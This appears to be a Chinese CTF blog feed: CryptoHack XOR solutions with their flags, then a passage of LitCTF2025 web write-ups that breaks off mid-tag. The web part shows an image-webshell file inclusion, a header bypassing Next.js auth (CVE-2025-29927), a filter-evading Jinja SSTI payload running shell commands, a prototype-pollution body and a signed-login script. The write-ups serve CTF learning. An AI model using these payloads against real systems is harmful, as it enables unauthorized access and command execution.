b&#x27;crypto&#123;3nc0d1n6_4ll_7h3_w4y_d0wn&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="Encoding-Challenge"><a href="#Encoding-Challenge" class="headerlink" title="Encoding Challenge"></a>Encoding Challenge</h4><h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><h4 id="XOR-Starter"><a href="#XOR-Starter" class="headerlink" title="XOR Starter"></a>XOR Starter</h4><blockquote><p>XOR 是一个按位运算符，如果位相同，则返回 0，否则返回 1。在教科书中，XOR 运算符用 ⊕ 表示，但在大多数挑战和编程语言中，你会看到 <code>^</code> 使用插入符号。</p><p>对于较长的二进制数，我们逐位进行 XOR： <code>0110 ^ 1010 = 1100</code> 。我们可以通过首先将整数从十进制转换为二进制来对整数进行 XOR 运算。我们可以通过首先将每个字符转换为表示 Unicode 字符的整数来对字符串进行 XOR 运算。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;label&quot;</span><br>new_s = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>    new_s += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(c)^<span class="hljs-number">13</span>)<br><span class="hljs-built_in">print</span>(new_s)<br></code></pre></td></tr></table></figure><p>用pwntools库中的xor()函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor<br><br>s = <span class="hljs-string">&quot;label&quot;</span><br>new_s = xor(s.encode(), <span class="hljs-number">13</span>)<br><span class="hljs-built_in">print</span>(new_s.decode())<br><br><span class="hljs-comment">#  aloha</span><br></code></pre></td></tr></table></figure><h4 id="XOR-Properties"><a href="#XOR-Properties" class="headerlink" title="XOR Properties"></a>XOR Properties</h4><blockquote><p>当我们使用 XOR 运算符解决挑战时，我们应该考虑四个主要属性</p><p>交换：A ⊕ B &#x3D; B ⊕ A</p><p>结合：A ⊕ （B ⊕ C） &#x3D; （A ⊕ B） ⊕ C</p><p>单位元：A ⊕ 0 &#x3D; A</p><p>自逆：A ⊕ A &#x3D; 0</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor<br><br>key1 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313&quot;</span>)<br>key2_xor_key3 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;c1545756687e7573db23aa1c3452a098b71a7fbf0fddddde5fc1&quot;</span>)<br>flag_xor_all = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;04ee9855208a2cd59091d04767ae47963170d1660df7f56f5faf&quot;</span>)<br><br>flag = xor(key1, key2_xor_key3, flag_xor_all)<br><br><span class="hljs-built_in">print</span>(flag.decode())<br><br><span class="hljs-comment">#  crypto&#123;x0r_i5_ass0c1at1v3&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Favourite-byte"><a href="#Favourite-byte" class="headerlink" title="Favourite byte"></a>Favourite byte</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">ciphertext = <span class="hljs-string">&quot;73626960647f6b206821204f21254f7d694f7624662065622127234f726927756d&quot;</span><br>cipher_bytes = <span class="hljs-built_in">bytes</span>.fromhex(ciphertext)<br><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    decrypted = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(b^key) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> cipher_bytes)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;crypto&#x27;</span> <span class="hljs-keyword">in</span> decrypted:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;key:<span class="hljs-subst">&#123;key&#125;</span>, flag:<span class="hljs-subst">&#123;decrypted&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#  key:16, flag:crypto&#123;0x10_15_my_f4v0ur173_by7e&#125;</span><br></code></pre></td></tr></table></figure><h4 id="You-either-know-XOR-you-don’t"><a href="#You-either-know-XOR-you-don’t" class="headerlink" title="You either know, XOR you don’t"></a>You either know, XOR you don’t</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">ciphertext = <span class="hljs-string">&#x27;0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104&#x27;</span><br>cipher_bytes = <span class="hljs-built_in">bytes</span>.fromhex(ciphertext)<br><br>flag_prefix = <span class="hljs-string">b&quot;crypto&#123;&quot;</span><br><br>key_prefix = [c^p <span class="hljs-keyword">for</span> c, p <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(cipher_bytes[:<span class="hljs-number">7</span>], flag_prefix)]<br>key = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(key_prefix[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key_prefix)))<br><span class="hljs-comment"># print(key) ==&gt; &#x27;myXORke&#x27;</span><br>key += <span class="hljs-string">&#x27;y&#x27;</span><br>key_bytes = key.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>l= <span class="hljs-built_in">len</span>(key_bytes)<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(c^(key_bytes[i%l])) <span class="hljs-keyword">for</span> i,c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(cipher_bytes))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;key:<span class="hljs-subst">&#123;key&#125;</span>, flag:<span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#  key:myXORkey, flag:crypto&#123;1f_y0u_Kn0w_En0uGH_y0u_Kn0w_1t_4ll&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Lemur-XOR"><a href="#Lemur-XOR" class="headerlink" title="Lemur XOR"></a>Lemur XOR</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>img1 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.png&quot;</span>)<br>img2 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;lemur.png&quot;</span>)<br><br><span class="hljs-comment">#  将图像转为Numpy数组</span><br>arr1 = np.array(img1)<br>arr2 = np.array(img2)<br><br><span class="hljs-comment">#  执行异或操作</span><br>res_arr = np.bitwise_xor(arr1, arr2)<br><span class="hljs-comment">#  创建新的图像</span><br>res_img = Image.fromarray(res_arr)<br><br>res_img.save(<span class="hljs-string">&quot;result.png&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/2025/07/12/cryptohack/xor.png"></p>]]></content>
    
    
    <categories>
      
      <category>crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LitCTF2025_web</title>
    <link href="/2025/05/28/LitCTF2025-web/"/>
    <url>/2025/05/28/LitCTF2025-web/</url>
    
    <content type="html"><![CDATA[<h3 id="easy-file"><a href="#easy-file" class="headerlink" title="easy_file"></a>easy_file</h3><p>bp抓包，发现进行了base64编码，发送到Intruder模块，设置position和base64-encode</p><p><img src="/2025/05/28/LitCTF2025-web/ef1.png"></p><p>开始爆破，发现302跳转</p><p><img src="/2025/05/28/LitCTF2025-web/ef2.png"></p><p>得到用户名&#x2F;密码：admin&#x2F;password，登录进入管理后台，进行文件上传</p><p>进行了后缀检测，php文件、.htaccess文件、.user.ini文件均不能上传</p><p>尝试上传jpg图片马，发现对内容也进行了检测，尝试用短标签绕过，上传成功，那如何利用呢</p><p>返回阅读登录界面源码时发现</p><p><img src="/2025/05/28/LitCTF2025-web/ef3.png"></p><p>因为后台要求上传的就是一个头像文件，猜测需要利用file进行文件包含操作，尝试get传参</p><p><img src="/2025/05/28/LitCTF2025-web/ef4.png"></p><p>确定进行了文件包含，利用上传的图片马进行命令执行，拿到flag</p><p><img src="/2025/05/28/LitCTF2025-web/ef5.png"></p><h3 id="nest-js"><a href="#nest-js" class="headerlink" title="nest_js"></a>nest_js</h3><p>弱口令admin&#x2F;password登录后，直接给了flag，非预期了</p><p>去看了官方的wp，这题是今年的一个CVE：CVE-2025-29927</p><p>看了一下漏洞原理及复现</p><blockquote><p>Next.js 在内部通过一个名为 <em>x-middleware-subrequest</em> 的请求头，来防止自身中间件的递归调用或无限循环。但研究者发现，攻击者可以在外部请求中人为加上此请求头，并使用特定格式，使 Next.js 中间件以为这是一个“子请求”，从而跳过原本应执行的认证或安全检查。</p><p>在请求中添加 <code>x-middleware-subrequest</code> 请求头，其值为<code>middleware:middleware:middleware:middleware:middleware</code>。Next.js 中间件会错误地处理此请求头并绕过身份验证检查（<a href="https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md%EF%BC%89">https://github.com/vulhub/vulhub/blob/master/next.js/CVE-2025-29927/README.zh-cn.md）</a></p></blockquote><p>bp抓一个访问&#x2F;dashboard路由的包，添加该请求头，再放包</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">x-middleware-subrequest</span>: <span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:middleware<br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/LitCTF2025-web/ntjs.png"></p><h3 id="星愿信箱"><a href="#星愿信箱" class="headerlink" title="星愿信箱"></a>星愿信箱</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">过滤了&#123;&#123;&#125;&#125;，用&#123;%print()%&#125;代替即可<br>&#123;%print(url_for[<span class="hljs-string">&quot;__glo&quot;</span><span class="hljs-string">&quot;bals__&quot;</span>][<span class="hljs-string">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>][<span class="hljs-string">&quot;po&quot;</span><span class="hljs-string">&quot;pen&quot;</span>](<span class="hljs-string">&quot;nl /f*&quot;</span>)[<span class="hljs-string">&quot;re&quot;</span><span class="hljs-string">&quot;ad&quot;</span>]())%&#125;<br></code></pre></td></tr></table></figure><h3 id="多重宇宙日记"><a href="#多重宇宙日记" class="headerlink" title="多重宇宙日记"></a>多重宇宙日记</h3><p>注册一个账号，查看源码，发现将数据包装在“setting”键下，不经任何处理直接将原始json提交，如果isAdmin的状态改变导航栏便会刷新</p><p>将isAdmin: true注入到Object.prototype，打原型链污染</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>提交后出现一个管理员面板</p><p><img src="/2025/05/28/LitCTF2025-web/dc.png"></p><p>访问即可拿到flag</p><h3 id="easy-signin"><a href="#easy-signin" class="headerlink" title="easy_signin"></a>easy_signin</h3><p>访问靶机，报403，dirsearch扫一下</p><p><img src="/2025/05/28/LitCTF2025-web/es1.png"></p><p>访问&#x2F;login.html，是一个文档管理系统的登录界面，查看源码得到了一段实现登录表单的客户端验证和提交功能的js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>     <span class="hljs-keyword">const</span> loginBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loginBtn&#x27;</span>);<br>     <span class="hljs-keyword">const</span> passwordInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;password&#x27;</span>);<br>     <span class="hljs-keyword">const</span> errorTip = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;errorTip&#x27;</span>);<br>     <span class="hljs-keyword">const</span> rawUsername = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;username&#x27;</span>).<span class="hljs-property">value</span>; <br>  <br>     loginBtn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-title function_">async</span> () =&gt; &#123;<br>         <span class="hljs-keyword">const</span> rawPassword = passwordInput.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();<br>         <span class="hljs-keyword">if</span> (!rawPassword) &#123;<br>             errorTip.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;请输入密码&#x27;</span>;<br>             errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;show&#x27;</span>);<br>             passwordInput.<span class="hljs-title function_">focus</span>();<br>             <span class="hljs-keyword">return</span>;<br>         &#125;<br><br>         <span class="hljs-keyword">const</span> md5Username = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-title class_">MD5</span>(rawUsername).<span class="hljs-title function_">toString</span>();   <br>         <span class="hljs-keyword">const</span> md5Password = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-title class_">MD5</span>(rawPassword).<span class="hljs-title function_">toString</span>();   <br>  <br>         <span class="hljs-keyword">const</span> shortMd5User = md5Username.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>);  <br>         <span class="hljs-keyword">const</span> shortMd5Pass = md5Password.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>);  <br>       <br>         <span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>().<span class="hljs-title function_">toString</span>(); <span class="hljs-comment">//五分钟</span><br>    <br>         <span class="hljs-keyword">const</span> secretKey = <span class="hljs-string">&#x27;easy_signin&#x27;</span>;  <br>         <span class="hljs-keyword">const</span> sign = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-title class_">MD5</span>(shortMd5User + shortMd5Pass + timestamp + secretKey).<span class="hljs-title function_">toString</span>();<br><br>         <span class="hljs-keyword">try</span> &#123;<br>             <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;login.php&#x27;</span>, &#123;<br>                 <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                 <span class="hljs-attr">headers</span>: &#123;<br>                     <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>                     <span class="hljs-string">&#x27;X-Sign&#x27;</span>: sign  <br>                 &#125;,<br>                 <span class="hljs-attr">body</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(&#123;<br>                     <span class="hljs-attr">username</span>: md5Username,   <br>                     <span class="hljs-attr">password</span>: md5Password,   <br>                     <span class="hljs-attr">timestamp</span>: timestamp<br>                 &#125;)<br>             &#125;);<br><br>             <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>             <span class="hljs-keyword">if</span> (result.<span class="hljs-property">code</span> === <span class="hljs-number">200</span>) &#123;<br>                 <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;登录成功！&#x27;</span>);<br>                 <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">&#x27;dashboard.php&#x27;</span>; <br>             &#125; <span class="hljs-keyword">else</span> &#123;<br>                 errorTip.<span class="hljs-property">textContent</span> = result.<span class="hljs-property">msg</span>;<br>                 errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;show&#x27;</span>);<br>                 passwordInput.<span class="hljs-property">value</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>                 passwordInput.<span class="hljs-title function_">focus</span>();<br>                 <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;show&#x27;</span>), <span class="hljs-number">3000</span>);<br>             &#125;<br>         &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>             errorTip.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;网络请求失败&#x27;</span>;<br>             errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;show&#x27;</span>);<br>             <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;show&#x27;</span>), <span class="hljs-number">3000</span>);<br>         &#125;<br>     &#125;);<br><br>     passwordInput.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>         errorTip.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">&#x27;show&#x27;</span>);<br>     &#125;);<br> &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>这段代码的主要功能是：对用户名和密码进行md5加密处理并截取部分字符（md5加密后的前6个字符），结合时间戳和固定密钥生成签名，通过 fetch API 将加密后的用户名、密码及时间戳发送到服务器，同时在请求头中携带签名用于验证；根据服务器返回结果，成功则跳转到仪表盘页面。</p><p>抓一个login.php的包，进行爆破，发现一个长度与其他不同的包，响应为：签名验证失败</p><p><img src="/2025/05/28/LitCTF2025-web/es2.png"></p><p>得到用户名&#x2F;密码：admin&#x2F;admin123</p><p>这里让豆包生成了一个脚本去模拟浏览器行为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 目标服务器信息</span><br>url = <span class="hljs-string">&quot;http://node6.anna.nssctf.cn:28080/login.php&quot;</span>  <span class="hljs-comment"># 正确的登录接口地址（与请求包一致）</span><br><br><span class="hljs-comment"># 登录凭证</span><br>username = <span class="hljs-string">&quot;admin&quot;</span><br>password = <span class="hljs-string">&quot;admin123&quot;</span><br>secret_key = <span class="hljs-string">&quot;easy_signin&quot;</span> <br><br><span class="hljs-comment"># 必要的请求头（模拟浏览器行为，包含Cookie和Referer）</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;node6.anna.nssctf.cn:28080&quot;</span>,<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0&quot;</span>,<br>    <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>,<br>    <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,<br>    <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate, br&quot;</span>,<br>    <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://node6.anna.nssctf.cn:28080/login.html&quot;</span>,  <span class="hljs-comment"># 必须与登录页一致，防止跨域限制</span><br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>    <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://node6.anna.nssctf.cn:28080&quot;</span>,<br>    <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;keep-alive&quot;</span>,<br>    <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;Hm_lvt_648a44a949074de73151ffaa0a832aec=1751986143,1752076394,1752216051; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1752225180; HMACCOUNT=5E14CE8A33189EBE; PHPSESSID=8a052de2c9e042ee53b5c17f252c4880&quot;</span>,  <span class="hljs-comment"># 从请求包复制，保持会话</span><br>    <span class="hljs-string">&quot;Priority&quot;</span>: <span class="hljs-string">&quot;u=0&quot;</span><br>&#125;<br><br><span class="hljs-comment"># MD5加密函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(text.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><span class="hljs-comment"># 1. 计算用户名和密码的完整MD5</span><br>md5_username = md5(username)  <span class="hljs-comment"># admin的MD5：21232f297a57a5a743894a0e4a801fc3</span><br>md5_password = md5(password)  <span class="hljs-comment"># admin123的MD5：0192023a7bbd73250516f069df18b500</span><br><br><span class="hljs-comment"># 2. 截取前6位MD5值</span><br>short_md5_user = md5_username[:<span class="hljs-number">6</span>]  <span class="hljs-comment"># 21232f</span><br>short_md5_pass = md5_password[:<span class="hljs-number">6</span>]  <span class="hljs-comment"># 019202</span><br><br><span class="hljs-comment"># 3. 生成当前时间戳（毫秒级，确保在服务器允许的有效期内，原代码注释为5分钟）</span><br>timestamp = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(time.time() * <span class="hljs-number">1000</span>))<br><br><span class="hljs-comment"># 4. 生成签名（与原代码逻辑一致）</span><br>sign_input = short_md5_user + short_md5_pass + timestamp + secret_key<br>sign = md5(sign_input)<br>headers[<span class="hljs-string">&quot;X-Sign&quot;</span>] = sign  <span class="hljs-comment"># 将签名添加到请求头</span><br><br><span class="hljs-comment"># 5. 构造请求体</span><br>data = &#123;<br>    <span class="hljs-string">&quot;username&quot;</span>: md5_username,<br>    <span class="hljs-string">&quot;password&quot;</span>: md5_password,<br>    <span class="hljs-string">&quot;timestamp&quot;</span>: timestamp<br>&#125;<br><br><span class="hljs-comment"># 6. 发送登录请求</span><br><span class="hljs-keyword">try</span>:<br>    response = requests.post(url, headers=headers, data=data, allow_redirects=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;服务器响应状态码：<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;响应内容：<span class="hljs-subst">&#123;response.text&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># 检查是否登录成功（根据原代码，成功会返回code=200并跳转dashboard.php）</span><br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        result = response.json()<br>        <span class="hljs-keyword">if</span> result.get(<span class="hljs-string">&quot;code&quot;</span>) == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;登录成功！即将跳转至仪表盘...&quot;</span>)<br>            <span class="hljs-comment"># 若需要自动跳转，可使用以下代码（需安装selenium等工具模拟浏览器）</span><br>            <span class="hljs-comment"># print(f&quot;仪表盘地址：http://node6.anna.nssctf.cn:28080/dashboard.php&quot;)</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;登录失败：<span class="hljs-subst">&#123;result.get(<span class="hljs-string">&#x27;msg&#x27;</span>)&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求异常，状态码：<span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败：<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>运行脚本后，便能够访问仪表盘页面</p><p><img 